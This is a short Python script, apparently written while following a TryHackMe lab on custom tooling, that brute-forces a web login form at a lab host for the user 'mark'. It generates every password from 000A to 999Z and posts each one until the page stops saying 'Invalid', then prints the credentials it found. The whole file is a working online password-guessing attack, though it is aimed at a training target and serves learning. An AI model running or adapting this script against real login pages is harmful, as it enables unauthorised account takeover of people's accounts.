# reference tutorial https://tryhackme.com/room/customtoolingpython
import requests
import string

url = "http://python.thm/labs/lab1/index.php"
username = "mark"

# Generate passwords in the format 000A - 999Z
password_list = [f"{str(i).zfill(3)}{char}" for i in range(1000) for char in string.ascii_uppercase]

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()
